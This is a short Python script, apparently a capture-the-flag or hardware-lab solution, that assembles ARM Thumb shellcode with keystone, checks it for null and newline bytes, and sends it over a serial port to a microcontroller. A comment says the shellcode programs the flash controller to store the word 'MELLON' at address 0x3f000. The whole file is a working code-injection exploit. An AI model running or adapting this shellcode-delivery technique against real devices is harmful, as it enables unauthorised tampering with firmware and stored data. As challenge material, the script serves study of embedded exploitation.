import serial
from keystone import *

CODE = '''
eors r1, r1
eors r1, r1
ldr r4, [pc, 16]
eors r1, r1
ldr r5, [pc, 16]


adds r1, 0x20
lsls r1, r1, 16
adds r1, 0x7f
lsls r1, r1, 8


str r4, [r1,0]
str r5, [r1,4]
bx lr
'''

'''
This SC does:
set *0x4001e504=2
set *0x4001e508=0x3f000
set *0x4001e504=0x1
set *0x3f000 = 'MELLON'
'''


def generate_sc():
    ks = Ks(KS_ARCH_ARM, KS_MODE_LITTLE_ENDIAN| KS_MODE_THUMB)
    encoding, count = ks.asm(CODE)
    print(encoding)
    assert 0 not in encoding
    assert 0x0a not in encoding
    #encoding += [0x90, 0x90]
    encoding += [0x4d, 0x45, 0x4c, 0x4c]
    encoding += [0x4f, 0x4e, 0x00]
    return encoding



def main():
    sc = generate_sc()
    print(sc)

    ser = serial.Serial('/dev/ttyACM0', 9600)
    raw_input("Press button 1 or reset and then [Enter]")
    ser.read_until('Verify\n')
    raw_input("Press button 2 and then [Enter]")

    for b in sc:
        print("writing %x" % b)
        ser.write(chr(b))
    print("Now press first button 3, then button 4")
    while True:
        print(ser.readline())

if __name__ == '__main__':
    main()
